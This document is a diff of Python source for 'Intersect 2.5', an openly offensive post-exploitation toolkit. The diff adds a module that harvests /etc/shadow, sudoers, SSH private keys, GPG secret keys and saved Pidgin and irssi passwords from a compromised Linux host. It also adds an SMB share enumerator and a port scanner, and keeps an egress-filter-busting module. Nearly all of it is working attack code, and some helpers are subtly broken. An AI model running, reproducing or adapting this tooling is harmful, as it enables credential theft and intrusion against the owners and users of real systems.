@@ -66,14 +66,14 @@ def environment():
     if os.geteuid() != 0:
         print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
         print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
-	option = raw_input("=> " )
+        option = raw_input("=> " )
         if option == '1':
             privesc()
             sys.exit()
         else:
             sys.exit()
     else:
-         pass
+        pass
 
     signal.signal(signal.SIGINT, signalHandler)
 
@@ -90,7 +90,7 @@ def environment():
 
     print "[!] Reports will be saved in: %s" % Temp_Dir
 
-  
+
 def signalHandler(signal, frame):
     print("[!] Ctrl-C caught, shutting down now");
     Shutdown()
@@ -99,13 +99,109 @@ def signalHandler(signal, frame):
 def Shutdown():
     if not os.listdir(Temp_Dir):
         os.rmdir(Temp_Dir)
+    sys.exit()
 
 def whereis(program):
     for path in os.environ.get('PATH', '').split(':'):
-       if os.path.exists(os.path.join(path, program)) and \
+        if os.path.exists(os.path.join(path, program)) and \
             not os.path.isdir(os.path.join(path, program)):
                 return os.path.join(path, program)
     return None
+
+
+def copy2temp(filename, subdir=""):
+    if os.path.exists(filename) is True: 
+        pass
+        if subdir == "" is True:
+            shutil.copy2(filename, Temp_Dir)
+        else:
+            if os.path.exists(Temp_Dir+"/"+subdir) is True:
+                subdir = (Temp_Dir+"/"+subdir)
+                shutil.copy2(filename, subdir)
+            elif os.path.exists(subdir) is True:
+                shutil.copy2(filename, subdir)
+            else:
+                subdir = (Temp_Dir+"/"+subdir)
+                os.mkdir(subdir)
+                shutil.copy2(filename, subdir)
+    else:
+        pass
+
+def write2file(filename, text):
+    if os.path.exists(filename) is True:
+        target = open(filename, "a")
+        target.write(text)
+        target.close()
+    else:
+        pass
+
+def writenew(filename, content):
+    new = open(filename, "a")
+    new.write(content)
+    new.close()
+
+def file2file(readfile, writefile):
+    if os.path.exists(readfile) is True:
+        readfile = open(readfile)
+        if os.path.exists(writefile) is True:
+            writefile = open(writefile, "a")
+            for lines in readfile.readlines():
+                writefile.write(lines)
+            writefile.close()
+            readfile.close()
+        else:
+            readfile.close()
+    else:
+        pass
+			
+def maketemp(subdir):
+    moddir = (Temp_Dir+"/"+subdir)
+    if os.path.exists(moddir) is False:
+        os.mkdir(moddir)
+    else:
+        pass
+
+def users():
+    global userlist
+    userlist = []
+    passwd = open('/etc/passwd')
+    for line in passwd:
+        fields = line.split(':')
+        uid = int(fields[2])
+        if uid > 500 and uid < 32328:
+            userlist.append(fields[0])
+
+def combinefiles(newfile, filelist):
+    content = ''
+    for f in filelist:
+        if os.path.exists(f) is True:
+            content = content + '\n' + open(f).read()
+            open(newfile,'wb').write(content)
+        else:
+            pass
+
+def tardir(name, directory):
+    tar = tarfile.open("%s.tar.gz", "w:gz" % name)
+    if os.path.exists(directory) is True:
+        tar.add("%s/" % directory)
+        print("[+] %s added to %s.tar.gz" % (name, directory))
+        tar.close()
+    else:
+        print("[!] Could not find directory %s " % directory)
+        tar.close()
+
+def tarlist(name, filelist):
+    tar = tarfile.open("%s.tar.gz" % name, "w:gz")
+    for files in filelist:
+        if os.path.exists(files) is True:
+            tar.add(files)
+        else:
+            print("[!] %s not found. Skipping.." % files)
+    tar.close()
+
+    print("[+] %s.tar.gz file created!" % name)
+
+
 
 
 def globalvars():
@@ -116,17 +212,21 @@ def globalvars():
     global PKEY
     global modList
 
-    modList = ['network', 'lanmap', 'webproxy', 'egressbuster']
+    modList = ['network', 'creds', 'egressbuster', 'openshares', 'portscan']
     PORT = 8888
-    RHOST = '192.168.1.4'
-    RPORT = 4444
+    RHOST = ''
+    RPORT = 8888
     PPORT = 8080
     PKEY = 'KXYRTUX'
-# Finds and saves network information such as listening ports, firewall rules, DNS configurations, network interfaces and active connections.
 def network():
+    '''
+    @description: collects network information such as listening ports, DNS info, active connections, firewall rules, etc
+    @author: ohdae [bindshell@live.com]
+    @short: enumerate network info
+    '''
     print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
-    os.mkdir(Temp_Dir+"/network")
-    networkdir = (Temp_Dir+"/network")
+    maketemp("network")
+    networkdir = Temp_Dir+"/network"
     os.chdir(networkdir) 
 
     proc = Popen('netstat --tcp --listening',
@@ -142,11 +242,9 @@ def network():
 
     os.system("lsof -nPi > lsof.txt")
     ports = ["nstat.txt","lsof.txt"]
-    content = ''
-    for f in ports:
-        content = content + '\n' + open(f).read()
-    open('Connections.txt','wb').write(content)
+    combinefiles("Connections.txt", ports)
     os.system("rm nstat.txt lsof.txt")
+
     if whereis('iptables') is not None:
         os.system("iptables -L -n > iptablesLN.txt") 
         os.system("iptables-save > iptables_save.txt")
@@ -167,91 +265,97 @@ def network():
         splitIP[3:] = (['0/24'])
         IPRange = ".".join(splitIP)
         externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
-        file = open("IPAddresses.txt", "a")
-        file.write("External IP Address: " + externalIP)
-        file.write("Internal IP Address: " + localIP)
-        file.write("Internal IP Range: " + IPRange)
-        file.close
+        text = ("External IP Address: " + externalIP + "\nInternal IP Address: " + localIP + "\nInternal IP Range: " + IPRange)
+        writenew("IPAddresses.txt", text)
    
     os.system("hostname -f > hostname.txt")
    
     netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
-    content = ''
-    for f in netfiles:
-        content = content + '\n' + open(f).read()
-    open('NetworkInfo.txt','wb').write(content)
+    combinefiles("NetworkInfo.txt", netfiles)
     os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")
 
     network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
     for x in network:
-        if os.path.exists(x) is True:
-            shutil.copy2(x, networkdir)
+        copy2temp(x, networkdir)
    
 
 
-# Enumerates live hosts running on the internal network. Captures internal and external IP address. Perform LAN network mapping.
-def lanmap():
-    # Combine ARP then portscan. Send IPs to list and iterate through for the scan
-    # Add service identification via socket for all open ports
-    # Add traceroute after finding live hosts. Send all results to graph report.
-   
-    print("[+] Searching for live hosts...")
-    os.mkdir(Temp_Dir+"/hosts")
-    os.chdir(Temp_Dir+"/hosts")
-
-    try:
-        #TODO:Consider scanning all non-loopback addresses for multi-homed machines
-        localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
-    except OSError:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("google.com",80))
-        localIP = (s.getsockname()[0])
-        s.close()
-    else:
-        pass
-    #Get the integer representation of the local IP address
-    ipBin = reduce(lambda x, y: (int(x) << 8)+int(y), localIP.split('.'))
-    #route = [ network_addr, netmask, gateway, interface, address ]
-    for route in scapy.all.conf.route.routes:
-        if (route[4] == localIP #If it's the address we're talking to
-            and route[0] != 0 #and it's not the route to the gateway itself
-            and route[0] == (route[1] & ipBin)): #And localIP is in this subnet (fixes 169.254/16 oddness)
-                #Calculate the CIDR from the base-2 logarithm of the netmask
-                IPRange = '/'.join((localIP, str(int(32-log(0xffffffff-route[1]+1,2)))))
+def creds():
+    '''
+    @description: Gather user and system credentials. Looks for passwords, SSH keys, SSL certs, certain application creds, user histories and more.
+    @author: ohdae [bindshell@live.com]
+    @short: enumerate user and system credentials
+    '''
+    print("[+] Collecting user and system credentials....")
+    maketemp("credentials")
+    os.chdir(Temp_Dir+"/credentials/")
     
-    conf.verb=0
-    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IPRange),timeout=2)
-    file = open("livehosts.txt", "a")
-    file.write("LAN IP Range: " + IPRange +"\n")
-    for snd,rcv in ans:
-        mac_address=rcv.sprintf("%Ether.src%")
-        ip_address=rcv.sprintf("%ARP.psrc%")
-        #print rcv.sprintf("\n\n[+] Live Host\nMAC %Ether.src%\nIP: %ARP.psrc%\n ")
-        file.write("\n[+] Live Host\nIP: "+ip_address + " MAC"+ mac_address + "\n")
-    file.write("\n")
-    file.close
+    os.system('getent passwd > passwd.txt')
+    os.system('getent shadow > shadow.txt')
+    os.system("lastlog > lastlog.txt")
+    os.system("last -a > last.txt")
+    os.system("getent aliases > mail_aliases.txt")
 
-    externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
-    file = open("external.txt", "a")
-    file.write("External IP Address: " + externalIP +"\n")
-    file.write("Internal IP Address: " + localIP +"\n")
-    file.write("Internal IP Range: " + IPRange +"\n")
-    file.close
     
- 
+    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
+    os.system("ls /home/*/.ssh/* > ssh_contents.txt")   
+    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
+    combinefiles("SSH_Locations.txt", sshfiles)
+    os.system("rm ssh_locations.txt ssh_contents.txt")
+    if os.path.exists(Home_Dir+"/.bash_history") is True:
+        os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")
 
-# Starts an HTTP proxy on the target system
-class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        self.copyfile(urllib2.urlopen(self.path), self.wfile)
 
-def httproxy():
-    httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
-    print("[+] Serving HTTP proxy on port %s" % PPORT)
-    httpd.serve_forever()
+    credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
+                    Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
+                    Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
+    for x in credentials:
+        copy2temp(x, "credentials")
 
-# Run an egress buster on the target system to determine available outbound ports. Checks ports 1-1000 by default. You can change this in final script or Modules/Custom/egressbuster
+
+	users()
+    if whereis('pidgin') is not None:
+        for user in userlist:
+            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
+                accts = open("/home/"+user+"/.purple/accounts.xml")
+                saved = open("Pidgin.txt", "a")
+                for line in accts.readlines():
+                    if '<protocol>' in line:
+                        saved.write(line)
+                    elif '<name>' in line:
+                        saved.write(line)
+                    elif '<password>' in line:
+                        saved.write(line)
+                    else:
+                        pass
+                    
+                accts.close()
+                saved.close()
+
+    for user in userlist:
+        if os.path.exists("/home/"+user+"/.irssi/config") is True:
+            accts = open("/home/"+user+"/.irssi/config")
+            saved = open("irssi.txt", "a")
+            for line in accts.readlines():
+                if "password = " in line:
+                    saved.write(line)
+                else:
+                    pass
+            accts.close()
+            saved.close()
+
+    for user in userlist:
+        copy2temp("/home/"+user+"/.znc/configs/znc.conf")
+           
+            
+
+
 def egressbuster():
+    '''
+    @description: Checks a range of ports to find available outbound ports. used to break egress filters.
+    @author: original code by David Kennedy aka ReL1K
+    @short: finds open outbound ports
+    '''
     if len(sys.argv) <=2:
         print("[!] Must specify a port-range!")
         sys.exit()
@@ -290,20 +394,75 @@ def start_socket(RHOST,base_port):
 
 
 
+def openshares():
+    '''
+    @description: Uses smbclient to find open SMB shares on a specified host. Usage: ./Intersect.py --openshares 192.168.1.4
+    @author: ohdae [bindshell@live.com]
+    @short: find open SMB shares
+    '''
+    ipaddr = sys.argv[2]
+
+    if whereis('smbclient') is None:
+        print("[!] SMBClient cannot be found on this system!")
+        sys.exit()
+
+    else:
+        print("[+] Enumerating open shares....\n")
+
+        os.popen("/usr/bin/smbclient -L %s -N" % ipaddr)
+
+        getdisks = os.popen(r'/usr/bin/smbclient -L %s -N 2>/dev/null| grep " Disk " | sed -e "s/ Disk .*//" | sed -e "s/^[ \t]*//"' % ipaddr)
+        disks = getdisks.readlines()
+        disks = filter(None, disks)
+        disks = [d.strip() for d in disks]
+        getdisks.close()
+
+        for disk in disks:
+            proc = Popen('/usr/bin/smbclient //%s/"%s" -N -c "dir;exit" 2>/dev/null'%(ipaddr,disk),
+                        shell=True,
+                        stdout=PIPE,
+                        )
+            output = proc.communicate()[0]
+            print("[+] Contents of %s " % disk)
+            print output		
+
+def portscan():
+    '''
+    @description: Very simple port scan. Scans ports 1 - 1000 on specified IP. Best used against LAN hosts. Usage: ./Intersect.py -p 192.168.1.4
+    @author: ohdae [bindshell@live.com]
+    @short: port scanner (-p <ip>)
+    '''
+    if len(sys.argv) <=2:
+        print("[!] Must specify an IP address!")
+        Shutdown()
+        
+    ipaddr = sys.argv[2]    
+    print("[+] Starting portscan of: %s " % ipaddr)
+
+    for i in range(1, 1000):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        result = s.connect_ex((ipaddr, i))
+        if(result == 0) :
+            print("[+] Port open %d " % (i,))
+        s.close()
+        
+
 
 def usage():
     print('============================================')
     print('   intersect 2.5 | custom version     ')
     print('      http://bindshell.it.cx | ohdae')
     print(' Modules:')
-    print('     -n   --network')
-    print('     -l   --lanmap')
-    print('     -w   --webproxy')
-    print('     -e   --egressbuster')
+    print('    -n    --network        enumerate network info')
+    print('    -c    --creds        enumerate user and system credentials')
+    print('    -e    --egressbuster        finds open outbound ports')
+    print('    -o    --openshares        find open SMB shares')
+    print('    -p    --portscan        port scanner (-p <ip>)')
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(sys.argv[1:], 'nlwe', ['network', 'lanmap', 'webproxy', 'egressbuster', 'help'])
+        opts, args = getopt.getopt(sys.argv[1:], 'nceop', ['network', 'creds', 'egressbuster', 'openshares', 'portscan', 'help'])
     except getopt.GetoptError, err:
         print str(err)
         Shutdown()
@@ -314,12 +473,14 @@ def main(argv):
             sys.exit(2)
         elif o in ('-n', '--network'):
             network()
-        elif o in ('-l', '--lanmap'):
-            lanmap()
-        elif o in ('-w', '--webproxy'):
-            webproxy()
+        elif o in ('-c', '--creds'):
+            creds()
         elif o in ('-e', '--egressbuster'):
             egressbuster()
+        elif o in ('-o', '--openshares'):
+            openshares()
+        elif o in ('-p', '--portscan'):
+            portscan()
         else:
             assert False, 'unhandled option'
     Shutdown()
